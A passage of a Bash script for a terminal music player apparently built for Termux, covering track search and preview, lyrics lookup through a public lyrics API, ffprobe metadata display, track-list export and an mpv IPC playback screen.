                                    local lttl="${_MP_META[title]}"
                                    if [[ -z "$lart" || -z "$lttl" ]]; then
                                        printf "  ${C30}Artist: ${RESET}"; read -r lart
                                        printf "  ${C30}Title:  ${RESET}"; read -r lttl
                                    fi
                                    if [[ -n "$lart" && -n "$lttl" ]]; then
                                        local enc_a enc_t
                                        enc_a=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$lart" 2>/dev/null)
                                        enc_t=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$lttl" 2>/dev/null)
                                        printf "  ${FADE}Fetching lyrics for: %s - %s${RESET}\n" "$lart" "$lttl"
                                        local lyrs; lyrs=$(curl -s --max-time 10 "https://api.lyrics.ovh/v1/${enc_a}/${enc_t}" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('lyrics','Not found'))" 2>/dev/null)
                                        echo "$lyrs" | less -R
                                    fi ;;
                                I)
                                    echo ""
                                    if command -v ffprobe &>/dev/null; then
                                        ffprobe -v quiet -print_format compact -show_format -show_streams "$cur_file" 2>&1 | grep -v "^$" | less
                                    else
                                        printf "  ${RED}ffprobe not found — pkg install ffmpeg${RESET}\n"
                                        printf "  ${FADE}Press ENTER...${RESET}"; read -r
                                    fi ;;
                                M|B|b) break ;;
                                Q|q) return ;;
                                *) ;;
                            esac
                        done
                    fi ;;
            esac
        done
    }

    # ── search by artist or title ────────────────────────────────────
    _mp_search() {
        _mp_scan
        if (( ${#_MP_FILES[@]} == 0 )); then
            printf "  ${RED}No tracks found.${RESET}\n"
            printf "  ${FADE}Press ENTER...${RESET}"; read -r; return
        fi
        while true; do
            clear; echo ""
            _dv30
            printf "  ${C30}${BOLD}SEARCH TRACKS${RESET}\n"
            _dv30; echo ""
            printf "  ${C30}Search (artist / title / [B] back): ${RESET}"; read -r query
            [[ "$query" == "B" || "$query" == "b" ]] && return
            [[ -z "$query" ]] && continue
            local -a results=()
            local qlower; qlower=$(echo "$query" | tr '[:upper:]' '[:lower:]')
            for f in "${_MP_FILES[@]}"; do
                local fname; fname=$(basename "$f" | tr '[:upper:]' '[:lower:]')
                local dname; dname=$(basename "$(dirname "$f")" | tr '[:upper:]' '[:lower:]')
                if [[ "$fname" == *"$qlower"* || "$dname" == *"$qlower"* ]]; then
                    results+=("$f")
                fi
            done
            if (( ${#results[@]} == 0 )); then
                printf "  ${RED}No matches for '%s'${RESET}\n" "$query"
                printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
            fi
            clear; echo ""
            _dv30
            printf "  ${C30}${BOLD}RESULTS FOR: %s  (%d found)${RESET}\n" "$query" "${#results[@]}"
            _dv30; echo ""
            for i in "${!results[@]}"; do
                printf "  ${C30}%3d.${RESET}  ${WH}%s${RESET}  ${FADE}[%s]${RESET}\n" \
                    "$((i+1))" \
                    "$(basename "${results[$i]}")" \
                    "$(basename "$(dirname "${results[$i]}")")"
            done
            echo ""; _dv30
            printf "  ${FADE}[P] Preview track · [D] Download · [B] New search${RESET}\n\n"
            printf "  ${C30}Pick number / P / D / B » ${RESET}"; read -r rc
            [[ "$rc" == "B" || "$rc" == "b" ]] && continue
            
            # Preview mode — ENHANCED WITH FULL METADATA
            if [[ "$rc" == "P" || "$rc" == "p" ]]; then
                echo ""
                printf "  ${C30}Track number to preview: ${RESET}"; read -r pn
                if [[ "$pn" =~ ^[0-9]+$ ]] && (( pn >= 1 && pn <= ${#results[@]} )); then
                    local pfile="${results[$((pn-1))]}"
                    clear; echo ""
                    _dv30
                    printf "  ${C30}${BOLD}TRACK PREVIEW  ·  ENHANCED METADATA${RESET}\n"
                    _dv30; echo ""
                    printf "  ${WH}File:${RESET}   %s\n" "$(basename "$pfile")"
                    printf "  ${FADE}Path:   %s${RESET}\n" "$pfile"
                    local sz; sz=$(du -sh "$pfile" 2>/dev/null | cut -f1)
                    printf "  ${WH}Size:${RESET}   %s\n" "$sz"
                    echo ""
                    
                    # Extract full metadata
                    _mp_extract_full_meta "$pfile"
                    
                    # Display metadata in organized box
                    printf "  ${C30}╭──── TRACK INFORMATION ──────────────────────────────────╮${RESET}\n"
                    [[ -n "${_MP_META[title]}" ]]    && printf "  ${C30}│${RESET} ${YEL}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Title:" "${_MP_META[title]:0:40}"
                    [[ -n "${_MP_META[artist]}" ]]   && printf "  ${C30}│${RESET} ${YEL}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Artist:" "${_MP_META[artist]:0:40}"
                    [[ -n "${_MP_META[album]}" ]]    && printf "  ${C30}│${RESET} ${YEL}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Album:" "${_MP_META[album]:0:40}"
                    [[ -n "${_MP_META[genre]}" ]]    && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Genre:" "${_MP_META[genre]:0:40}"
                    [[ -n "${_MP_META[year]}" ]]     && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Year:" "${_MP_META[year]:0:40}"
                    printf "  ${C30}├──── AUDIO QUALITY ──────────────────────────────────────┤${RESET}\n"
                    [[ -n "${_MP_META[duration]}" ]]     && printf "  ${C30}│${RESET} ${YEL}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Duration:" "${_MP_META[duration]}"
                    [[ -n "${_MP_META[bitrate]}" ]]      && printf "  ${C30}│${RESET} ${YEL}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Bitrate:" "${_MP_META[bitrate]}"
                    [[ -n "${_MP_META[sample_rate]}" ]]  && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Sample Rate:" "${_MP_META[sample_rate]}"
                    [[ -n "${_MP_META[channels]}" ]]     && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Channels:" "${_MP_META[channels]}"
                    [[ -n "${_MP_META[codec]}" ]]        && printf "  ${C30}│${RESET} ${FADE}%-13s${RESET} ${WH}%-40s${RESET} ${C30}│${RESET}\n" "Codec:" "${_MP_META[codec]:0:40}"
                    printf "  ${C30}╰──────────────────────────────────────────────────────────╯${RESET}\n"
                    
                    echo ""; _dv30
                    printf "  ${C30}[P] 30s clip  [F] Full play  [W] Waveform  [ENTER] Back » ${RESET}"; read -r _pvopt
                    case "$_pvopt" in
                        P|p) _mp_check; printf "  ${C30}▶ Playing 30s preview...${RESET}\n\n"
                             mpv --no-video --start=0 --length=30 "$pfile" 2>/dev/null
                             printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        F|f) _mp_check; printf "  ${C30}▶ Playing full track...${RESET}\n\n"
                             mpv --no-video "$pfile" 2>/dev/null
                             printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        W|w) 
                             echo ""
                             printf "  ${C30}⚡ Generating waveform...${RESET}\n"
                             local wf; wf=$(_mp_generate_waveform "$pfile")
                             if [[ -n "$wf" ]]; then
                                 printf "  ${GRN}✓ Saved: %s${RESET}\n" "$wf"
                                 if command -v termux-open &>/dev/null; then
                                     termux-open "$wf" 2>/dev/null
                                 fi
                             else
                                 printf "  ${RED}Failed — install ffmpeg${RESET}\n"
                             fi
                             printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        *) ;;
                    esac
                fi
                continue
            fi
            
            # Download mode
            if [[ "$rc" == "D" || "$rc" == "d" ]]; then
                echo ""
                printf "  ${C30}Track number to download: ${RESET}"; read -r dn
                if [[ "$dn" =~ ^[0-9]+$ ]] && (( dn >= 1 && dn <= ${#results[@]} )); then
                    local dfile="${results[$((dn-1))]}"
                    local ddir="$HOME/storage/downloads/music_library"
                    mkdir -p "$ddir" 2>/dev/null
                    cp "$dfile" "$ddir/" 2>/dev/null && {
                        printf "  ${GRN}✓ Downloaded to: %s${RESET}\n" "$ddir/$(basename "$dfile")"
                    } || {
                        printf "  ${RED}✗ Download failed${RESET}\n"
                    }
                    printf "  ${FADE}Press ENTER...${RESET}"; read -r
                fi
                continue
            fi
            
            # Play mode (original functionality)
            if [[ "$rc" =~ ^[0-9]+$ ]] && (( rc >= 1 && rc <= ${#results[@]} )); then
                _mp_check
                local ridx=$(( rc - 1 ))
                printf "  ${C30}▶ Playing: %s${RESET}\n" "$(basename "${results[$ridx]}")"
                printf "  ${FADE}< and > skip tracks · Space pause · Q quit${RESET}\n\n"
                # build mini playlist from results, start at picked
                local tmppl="${TMPDIR:-/tmp}/fezzy_sr_$$.m3u"
                printf "#EXTM3U\n" > "$tmppl"
                for f in "${results[@]}"; do echo "$f"; done >> "$tmppl"
                mpv --no-video --playlist="$tmppl" --playlist-start="$ridx" 2>/dev/null
                rm -f "$tmppl"
                printf "  ${FADE}Press ENTER...${RESET}"; read -r
            fi
        done
    }

    # ── lyrics for current/picked track ─────────────────────────────
    _mp_lyrics() {
        local LYRDIR="$HOME/storage/downloads/playlists/lyrics"
        mkdir -p "$LYRDIR" 2>/dev/null
        while true; do
            clear; echo ""
            _dv30
            printf "  ${C30}${BOLD}LYRICS  ·  lyrics.ovh${RESET}\n"
            printf "  ${FADE}Find lyrics while you listen · save locally${RESET}\n"
            _dv30; echo ""
            printf "  ${C30}Artist name (or [B] back): ${RESET}"; read -r ml_art
            [[ "$ml_art" == "B" || "$ml_art" == "b" ]] && return
            [[ -z "$ml_art" ]] && continue
            printf "  ${C30}Song title: ${RESET}"; read -r ml_ttl
            [[ -z "$ml_ttl" ]] && continue
            clear; echo ""
            _dv30
            printf "  ${C30}Fetching: %s — %s${RESET}\n" "$ml_art" "$ml_ttl"
            _dv30; echo ""
            local enc_art enc_ttl lyr_raw lyr_text
            enc_art=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$ml_art" 2>/dev/null)
            enc_ttl=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$ml_ttl" 2>/dev/null)
            lyr_raw=$(curl -s --max-time 10 "https://api.lyrics.ovh/v1/${enc_art}/${enc_ttl}" 2>/dev/null)
            lyr_text=$(echo "$lyr_raw" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    print(d.get('lyrics',''))
except:
    print('')
" 2>/dev/null)
            if [[ -n "$lyr_text" ]]; then
                echo "$lyr_text" | less -R
                echo ""
                printf "  ${C30}Save to file? [Y/N]: ${RESET}"; read -r ml_sv
                if [[ "$ml_sv" == "Y" || "$ml_sv" == "y" ]]; then
                    local sname
                    sname=$(echo "${ml_art}_${ml_ttl}" | tr ' /' '__' | tr -cd '[:alnum:]_-')
                    local lfile="$LYRDIR/${sname}.txt"
                    printf "ARTIST: %s\nTITLE:  %s\n\n%s\n" "$ml_art" "$ml_ttl" "$lyr_text" > "$lfile"
                    printf "  ${GRN}✓ Saved: %s${RESET}\n" "$lfile"
                    printf "  ${FADE}Press ENTER...${RESET}"; read -r
                fi
            else
                printf "  ${RED}No lyrics found for: %s — %s${RESET}\n" "$ml_art" "$ml_ttl"
                printf "  ${FADE}Press ENTER...${RESET}"; read -r
            fi
        done
    }

    # ── lyrics while playing (background + fetch) ────────────────────
    _mp_lyrics_play() {
        _mp_check; _mp_scan
        if (( ${#_MP_FILES[@]} == 0 )); then
            printf "  ${RED}No tracks found.${RESET}\n"; sleep 1; return
        fi
        clear; echo ""
        _dv30
        printf "  ${C30}${BOLD}LYRICS WHILE PLAYING${RESET}\n"
        printf "  ${FADE}Pick a track → lyrics fetched → plays in background${RESET}\n"
        _dv30; echo ""
        for i in "${!_MP_FILES[@]}"; do
            printf "  ${C30}%3d.${RESET}  ${WH}%s${RESET}\n" "$((i+1))" "$(basename "${_MP_FILES[$i]}")"
        done
        echo ""; _dv30
        printf "  ${FADE}[B] Back${RESET}\n\n"
        printf "  ${C30}Track number or B » ${RESET}"; read -r lp_n
        [[ "$lp_n" == "B" || "$lp_n" == "b" ]] && return
        if [[ "$lp_n" =~ ^[0-9]+$ ]] && (( lp_n >= 1 && lp_n <= ${#_MP_FILES[@]} )); then
            local picked="${_MP_FILES[$((lp_n-1))]}"
            local bname; bname=$(basename "$picked")
            # Parse artist and title from filename (Artist - Title.ext pattern)
            local guessed_art guessed_ttl
            if [[ "$bname" == *" - "* ]]; then
                guessed_art=$(echo "$bname" | sed 's/ - .*//')
                guessed_ttl=$(echo "$bname" | sed 's/.*- //' | sed 's/\.[^.]*$//')
            else
                guessed_art=""
                guessed_ttl=$(echo "$bname" | sed 's/\.[^.]*$//')
            fi
            echo ""
            printf "  ${C30}Artist (detected: %s): ${RESET}" "${guessed_art:-unknown}"
            read -r lp_art
            [[ -z "$lp_art" ]] && lp_art="$guessed_art"
            printf "  ${C30}Title  (detected: %s): ${RESET}" "${guessed_ttl:-unknown}"
            read -r lp_ttl
            [[ -z "$lp_ttl" ]] && lp_ttl="$guessed_ttl"
            # Start playback in background
            nohup mpv --no-video "$picked" &>/dev/null &
            local mpv_bg_pid=$!
            echo ""
            printf "  ${C30}▶ Playing in background · PID %d${RESET}\n" "$mpv_bg_pid"
            printf "  ${FADE}Fetching lyrics...${RESET}\n\n"
            local enc_art enc_ttl lyr_raw lyr_text
            enc_art=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$lp_art" 2>/dev/null)
            enc_ttl=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$lp_ttl" 2>/dev/null)
            lyr_raw=$(curl -s --max-time 10 "https://api.lyrics.ovh/v1/${enc_art}/${enc_ttl}" 2>/dev/null)
            lyr_text=$(echo "$lyr_raw" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    print(d.get('lyrics',''))
except:
    print('')
" 2>/dev/null)
            if [[ -n "$lyr_text" ]]; then
                clear; echo ""
                _dv30
                printf "  ${C30}${BOLD}LYRICS: %s — %s${RESET}\n" "$lp_art" "$lp_ttl"
                printf "  ${FADE}▶ Playing in background · [9] to stop${RESET}\n"
                _dv30; echo ""
                echo "$lyr_text"
                echo ""; _dv30
            else
                printf "  ${RED}No lyrics found. Playing track anyway.${RESET}\n"
            fi
            printf "  ${FADE}Press ENTER to return to menu (music keeps playing)...${RESET}"; read -r
        fi
    }

    # ── track info (ffprobe) ──────────────────────────────────────────
    _mp_track_info() {
        _mp_scan
        if (( ${#_MP_FILES[@]} == 0 )); then
            printf "  ${RED}No tracks found.${RESET}\n"; sleep 1; return
        fi
        clear; echo ""
        _dv30
        printf "  ${C30}${BOLD}TRACK INFO${RESET}\n"
        _dv30; echo ""
        for i in "${!_MP_FILES[@]}"; do
            printf "  ${C30}%3d.${RESET}  ${WH}%s${RESET}\n" "$((i+1))" "$(basename "${_MP_FILES[$i]}")"
        done
        echo ""; _dv30
        printf "  ${FADE}[B] Back${RESET}\n\n"
        printf "  ${C30}Track number or B » ${RESET}"; read -r tn
        [[ "$tn" == "B" || "$tn" == "b" ]] && return
        if [[ "$tn" =~ ^[0-9]+$ ]] && (( tn >= 1 && tn <= ${#_MP_FILES[@]} )); then
            local picked="${_MP_FILES[$((tn-1))]}"
            clear; echo ""
            _dv30
            printf "  ${C30}${BOLD}TRACK INFO: %s${RESET}\n" "$(basename "$picked")"
            _dv30; echo ""
            printf "  ${WH}File:${RESET}  %s\n" "$picked"
            local sz; sz=$(du -sh "$picked" 2>/dev/null | cut -f1)
            printf "  ${WH}Size:${RESET}  %s\n" "$sz"
            if command -v ffprobe &>/dev/null; then
                echo ""
                ffprobe -v quiet -show_format -show_streams "$picked" 2>&1                     | grep -E "codec_name|bit_rate|sample_rate|channels|duration|TAG:artist|TAG:title|TAG:album|format_name"                     | sed 's/^/  /'
            else
                printf "  ${YEL}ffprobe not found. Install: pkg install ffmpeg${RESET}\n"
                # fallback: file size and extension
                printf "  ${WH}Ext:${RESET}   %s\n" "${picked##*.}"
            fi
            echo ""; _dv30
            printf "  ${FADE}Press ENTER...${RESET}"; read -r
        fi
    }

    # ── export track list to TXT ──────────────────────────────────────
    _mp_export_list() {
        _mp_scan
        if (( ${#_MP_FILES[@]} == 0 )); then
            printf "  ${RED}No tracks found.${RESET}\n"; sleep 1; return
        fi
        local out="$HOME/storage/downloads/fezzy_tracklist_$(date +%Y%m%d_%H%M).txt"
        {
            printf "FEZZY PORTALS — TRACK LIST EXPORT\n"
            printf "Generated: %s\n" "$(date '+%Y-%m-%d %H:%M:%S')"
            printf "Total: %d tracks\n\n" "${#_MP_FILES[@]}"
            for i in "${!_MP_FILES[@]}"; do
                printf "%4d. %s\n" "$((i+1))" "$(basename "${_MP_FILES[$i]}")"
            done
        } > "$out"
        printf "  ${GRN}✓ Exported %d tracks to:\n  %s${RESET}\n" "${#_MP_FILES[@]}" "$out"
        printf "  ${FADE}Press ENTER...${RESET}"; read -r
    }

    # ── mpv IPC communication helper ─────────────────────────────────
    _mp_ipc_send() {
        local socket="$1"
        local cmd="$2"
        [[ ! -S "$socket" ]] && return 1
        echo "$cmd" | socat -t1 - "UNIX-CONNECT:$socket" 2>/dev/null
    }

    # ── IPC Full Player · playlist · art · inline controls · track counter ──
    _mp_ipc_player() {
        if ! command -v socat &>/dev/null; then
            printf "  ${YEL}socat not found — installing...${RESET}\n"
            pkg install socat -y || { printf "  ${RED}Failed to install socat${RESET}\n"; sleep 2; return; }
        fi
        _mp_check; _mp_scan
        if (( ${#_MP_FILES[@]} == 0 )); then
            printf "  ${RED}No tracks found — check /sdcard/Download/FezzyStation${RESET}\n"; sleep 1; return
        fi

        _ipc_tw() {
            local txt="$1" spd="${2:-0.028}" i
            for (( i=0; i<${#txt}; i++ )); do printf "%s" "${txt:$i:1}"; sleep "$spd"; done
        }
        _ipc_glitch() {
            local txt="$1" g=("▓" "░" "▒" "▄" "▀" "■" "×" "%" "$" "#" "!") out="" i ch
            for (( i=0; i<${#txt}; i++ )); do
                ch="${txt:$i:1}"
                (( RANDOM%7==0 )) && out+="${g[$((RANDOM%${#g[@]}))]}" || out+="$ch"
            done
            printf "%s" "$out"
        }
        _ipc_wave() {
            local w=46 b=("▁" "▂" "▃" "▄" "▅" "▆" "▇" "█") out="" i
            for (( i=0; i<w; i++ )); do out+="${b[$((RANDOM%8))]}"; done
            printf "%s" "$out"
        }
        _ipc_lyrics() {
            local artist="$1" title="$2" out="$3"
            [[ -f "$out" ]] && return
            if [[ -n "$artist" && -n "$title" ]]; then
                local ea et raw
                ea=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$artist" 2>/dev/null)
                et=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$title" 2>/dev/null)
                raw=$(curl -sf --max-time 3 "https://api.lyrics.ovh/v1/${ea}/${et}" 2>/dev/null | \
                    python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    lines=[l.strip() for l in d.get('lyrics','').split('\n') if l.strip()]
    print('\n'.join(lines))
except: pass" 2>/dev/null)
                [[ -n "$raw" ]] && printf "%s" "$raw">"$out" || \
                    printf "signal lost · no lyrics on the wire\nfrequency searching · Bojack is waiting\n999 · SOI · Ravensmead\nstrategy over impulse · always">"$out"
            else
                printf "embed artist+title tags to pull lyrics\n999 · SOI · Ravensmead · always">"$out"
            fi
        }
        _ipc_extract_art() {
            local infile="$1" artfile="$2"
            [[ -f "$artfile" && -s "$artfile" ]] && return 0
            command -v ffmpeg &>/dev/null || return 1
            ffmpeg -y -i "$infile" -an -vcodec copy "$artfile" 2>/dev/null
            [[ -f "$artfile" && -s "$artfile" ]] && return 0
            rm -f "$artfile" 2>/dev/null; return 1
        }
        _ipc_show_art() {
            local artfile="$1"
            [[ ! -f "$artfile" ]] && return 1
            if command -v jp2a &>/dev/null; then
                jp2a --width=46 --colors "$artfile" 2>/dev/null && return 0
            fi
            if command -v img2txt &>/dev/null; then
                img2txt -W 46 -f utf8 "$artfile" 2>/dev/null && return 0
            fi
            return 1
        }

        local _soi=(
            "legend never dies · the signal stays alive · 999"
            "strategy over impulse · Ravensmead to the world"
            "Bojack on the wire · static coursing through the soul"
            "Admin and the ghost both tuned in tonight"
            "turn the struggle into something · SOI"
            "the vault is open · let the frequency breathe"
            "every bar is a scar that learned to sing"
            "you can't kill what already survived the static"
            "no signal lost · only signals waiting to be found"
            "frequency locked · 999 · til the last track drops"
        )

        local total_tracks=${#_MP_FILES[@]}
        local _ipc_page=0 _ipc_psize=18
        while true; do
            clear; echo ""
            local _COLS; _COLS=$(tput cols 2>/dev/null || echo 56)
            local _IPCW=$(( _COLS - 4 ))
            local _BORDER; printf -v _BORDER "%${_IPCW}s" ""; _BORDER="${_BORDER// /═}"
            local _FILL;  printf -v _FILL  "%${_IPCW}s" ""; _FILL="${_FILL// / }"
            printf "  \033[2m╔%s╗\033[0m\n" "$_BORDER"
            printf "  \033[2m║\033[0m  \033[1;36m"
            _ipc_tw "◈  IPC  PLAYER  ·  PLAYLIST  MODE  ·  999" 0.018
            printf "\033[0m  \033[2m║\033[0m\n"
            printf "  \033[2m╚%s╝\033[0m\n\n" "$_BORDER"
            local _start=$(( _ipc_page * _ipc_psize ))
            local _end=$(( _start + _ipc_psize - 1 ))
            [[ $_end -ge $total_tracks ]] && _end=$(( total_tracks - 1 ))
            local _pages=$(( (total_tracks + _ipc_psize - 1) / _ipc_psize ))
            printf "  \033[2m%d tracks  ·  page %d/%d\033[0m\n\n" "$total_tracks" "$(( _ipc_page+1 ))" "$_pages"
            for (( i=_start; i<=_end; i++ )); do
                local bn; bn="$(basename "${_MP_FILES[$i]%.*}")"
                printf "  \033[0;36m%3d\033[0m \033[2m·\033[0m \033[0;37m%.44s\033[0m\n" "$((i+1))" "$bn"
            done
            echo ""
            printf "  \033[2m┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\033[0m\n"
            printf "  \033[2m[num]=start  [S]=shuffle  [N]=next page  [P]=prev page  [B]=back\033[0m\n"
            printf "  \033[2m┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\033[0m\n\n"
            printf "  \033[0;36m» \033[0m"; read -r ipc_n
            case "${ipc_n^^}" in
                B) return ;;
                N) (( _ipc_page < _pages-1 )) && (( _ipc_page++ )); continue ;;
                P) (( _ipc_page > 0 )) && (( _ipc_page-- )); continue ;;
                *) break ;;
            esac
        done

        local ipc_shuffle="no"
        if [[ "$ipc_n" == "S" || "$ipc_n" == "s" ]]; then
            ipc_shuffle="yes"; ipc_n=1
        fi
        if ! [[ "$ipc_n" =~ ^[0-9]+$ ]] || (( ipc_n<1 || ipc_n>total_tracks )); then
            printf "  \033[0;31m✗ not on the frequency\033[0m\n"; sleep 0.8; return
        fi

        local ipc_start=$(( ipc_n - 1 ))
        local ipc_socket="${TMPDIR:-/tmp}/fezzy_mpv_ipc_$$.sock"
        local lyric_file="${TMPDIR:-/tmp}/fezzy_ipc_lyric_$$.txt"
        local art_file="${TMPDIR:-/tmp}/fezzy_ipc_art_$$.jpg"
        local ipc_playlist="${TMPDIR:-/tmp}/fezzy_ipc_pl_$$.m3u"

        printf "#EXTM3U\n" > "$ipc_playlist"
        for f in "${_MP_FILES[@]}"; do echo "$f"; done >> "$ipc_playlist"

        clear; echo ""
        printf "  \033[1;36m"; _ipc_tw "⟁  LOCKING SIGNAL  ·  STAND BY  ·  999" 0.03; printf "\033[0m\n\n"
        printf "  \033[2m%s\033[0m\n" "$(basename "${_MP_FILES[$ipc_start]}")"
        printf "  \033[2mPlaylist: %d tracks queued\033[0m\n\n" "$total_tracks"
        local _sp=("◐" "◓" "◑" "◒") _si=0 _s
        for _s in 1 2 3 4; do
            printf "\r  \033[0;36m%s\033[0m  \033[2mtuning to frequency...\033[0m   " "${_sp[$((_si%4))]}"; ((_si++)); sleep 0.3
        done
        printf "\r  \033[0;32m✓\033[0m  \033[1mfrequency acquired · dropping in\033[0m             \n\n"

        local ff_codec="" ff_br="" ff_ch="" ff_sr="" ff_genre="" ff_year="" ff_tracknum="" starting_track="${_MP_FILES[$ipc_start]}"
        if command -v ffprobe &>/dev/null; then
            local _ffr
            _ffr=$(ffprobe -v quiet \
                -show_entries format=bit_rate \
                -show_entries format_tags=genre,date,track \
                -show_entries stream=codec_name,channels,sample_rate \
                -of default=noprint_wrappers=1 "$starting_track" 2>/dev/null)
            ff_codec=$(printf "%s" "$_ffr"|grep '^codec_name='|head -1|cut -d= -f2)
            ff_br=$(printf "%s"    "$_ffr"|grep '^bit_rate='|head -1|cut -d= -f2)
            ff_ch=$(printf "%s"    "$_ffr"|grep '^channels='|head -1|cut -d= -f2)
            ff_sr=$(printf "%s"    "$_ffr"|grep '^sample_rate='|head -1|cut -d= -f2)
            ff_genre=$(printf "%s" "$_ffr"|grep '^TAG:genre='|head -1|cut -d= -f2)
            ff_year=$(printf "%s"  "$_ffr"|grep '^TAG:date='|head -1|cut -d= -f2|cut -c1-4)
            ff_tracknum=$(printf "%s" "$_ffr"|grep '^TAG:track='|head -1|cut -d= -f2|cut -d/ -f1)
            [[ -n "$ff_br" ]] && ff_br=$(( ff_br/1000 ))" kbps"
            [[ -n "$ff_sr" ]] && ff_sr=$(( ff_sr/1000 ))" kHz"
            case "$ff_ch" in 1) ff_ch="Mono";; 2) ff_ch="Stereo";; esac
        fi

        ( _ipc_extract_art "$starting_track" "$art_file" 2>/dev/null ) & disown $! 2>/dev/null

        if [[ "$ipc_shuffle" == "yes" ]]; then
            nohup mpv --no-video --shuffle --loop-playlist=inf \
                --input-ipc-server="$ipc_socket" --playlist="$ipc_playlist" &>/dev/null &
        else
            nohup mpv --no-video --loop-playlist=inf \
                --input-ipc-server="$ipc_socket" \
                --playlist="$ipc_playlist" --playlist-start="$ipc_start" &>/dev/null &
        fi
        local mpv_pid=$!; sleep 0.6
        local wc=0
        while [[ ! -S "$ipc_socket" ]] && (( wc<12 )); do sleep 0.2; (( wc++ )); done
        if [[ ! -S "$ipc_socket" ]]; then
            printf "  \033[0;31m✗ IPC socket failed · signal dead\033[0m\n"
            kill $mpv_pid 2>/dev/null; rm -f "$ipc_playlist"
            printf "  \033[2mPress ENTER...\033[0m"; read -r; return
        fi

        local running=1 tick=0 soi_idx=0 lyric_fetched=0
        local last_track_key="" art_loaded=0 art_ascii=""
        trap 'running=0' INT

        local _mpv_retry=0
        while [[ $running -eq 1 ]]; do
            if ! kill -0 $mpv_pid 2>/dev/null; then
                (( _mpv_retry++ ))
                (( _mpv_retry > 4 )) && break
                sleep 0.3; continue
            fi
            _mpv_retry=0

            local time_pos duration paused_raw vol_raw pl_pos pl_count
            time_pos=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","time-pos"]}' | grep -o '"data":[0-9.]*' | cut -d: -f2)
            duration=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","duration"]}' | grep -o '"data":[0-9.]*' | cut -d: -f2)
            paused_raw=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","pause"]}' | grep -o '"data":[a-z]*' | cut -d: -f2)
            vol_raw=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","volume"]}' | grep -o '"data":[0-9.]*' | cut -d: -f2)
            pl_pos=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","playlist-pos"]}' | grep -o '"data":[0-9]*' | cut -d: -f2)
            pl_count=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","playlist-count"]}' | grep -o '"data":[0-9]*' | cut -d: -f2)
            local meta_artist meta_title meta_album meta_genre meta_year meta_tracknum
            meta_artist=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","metadata/by-key/artist"]}' 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',''))" 2>/dev/null)
            meta_title=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","metadata/by-key/title"]}' 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',''))" 2>/dev/null)
            meta_album=$(_mp_ipc_send "$ipc_socket" '{"command":["get_property","metadata/by-key/album"]}' 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',''))" 2>/dev/null)

            local pos_int dur_int
            pos_int=$(echo "$time_pos"|awk '{print int($1)}' 2>/dev/null); [[ -z "$pos_int" ]] && pos_int=0
            dur_int=$(echo "$duration"|awk '{print int($1)}' 2>/dev/null); [[ -z "$dur_int" ]] && dur_int=1
            [[ -z "$pl_pos"   ]] && pl_pos=0
            [[ -z "$pl_count" ]] && pl_count="$total_tracks"
            local vol_int; vol_int=$(echo "$vol_raw"|awk '{print int($1)}' 2>/dev/null); [[ -z "$vol_int" ]] && vol_int=100
            local track_num=$(( pl_pos + 1 ))

            # Track change detection
            local cur_track_key="${pl_pos}_${meta_title}"
            if [[ "$cur_track_key" != "$last_track_key" ]]; then
                last_track_key="$cur_track_key"
                lyric_fetched=0; art_loaded=0; art_ascii=""
                rm -f "$lyric_file" "$art_file" 2>/dev/null
                local cur_file="${_MP_FILES[$pl_pos]:-}"
                if [[ -n "$cur_file" ]]; then
                    ( _ipc_extract_art "$cur_file" "$art_file" 2>/dev/null ) & disown $! 2>/dev/null
                    if command -v ffprobe &>/dev/null; then
                        local _ffr2
                        _ffr2=$(ffprobe -v quiet \
                            -show_entries format=bit_rate \
                            -show_entries format_tags=genre,date,track \
                            -show_entries stream=codec_name,channels,sample_rate \
